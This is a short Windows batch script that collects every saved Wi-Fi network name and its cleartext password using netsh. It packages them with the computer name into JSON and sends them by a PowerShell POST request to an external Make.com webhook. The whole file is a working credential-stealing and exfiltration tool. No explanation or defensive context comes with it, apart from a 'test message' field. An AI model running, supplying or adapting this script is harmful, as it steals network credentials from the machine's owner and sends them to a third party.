@echo off
setlocal enabledelayedexpansion

REM Variable to hold the Wi-Fi data
set "wifiData="

REM Get the computer name
set "computerName=%COMPUTERNAME%"

for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do (
    set "ssid=%%j"
    if "!ssid:~0,1!"==" " set "ssid=!ssid:~1!"
    for /f "tokens=2 delims=:" %%k in ('netsh wlan show profile name^="!ssid!" key^=clear ^| findstr /C:"Key Content"') do (
        set "key=%%k"
        if "!key:~0,1!"==" " set "key=!key:~1!"
        set "wifiData=!wifiData!!ssid!: !key!`n"
    )
)

REM Remove the last newline character
set "wifiData=!wifiData:~0,-2!"

REM Create a JSON payload with Wi-Fi data, computer name, and test message
set "jsonPayload={\"computer_name\":\"%computerName%\",\"wifi_data\":\"%wifiData%\",\"test_message\":\"This is a test message.\"}"

REM Send the data to the webhook using PowerShell
powershell -Command ^
$webhookUrl = 'https://hook.eu2.make.com/x87ml93t9r3p2ns1ro65fb7fanmznaom'; ^
$jsonPayload = '%jsonPayload%'; ^
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $jsonPayload;

pause
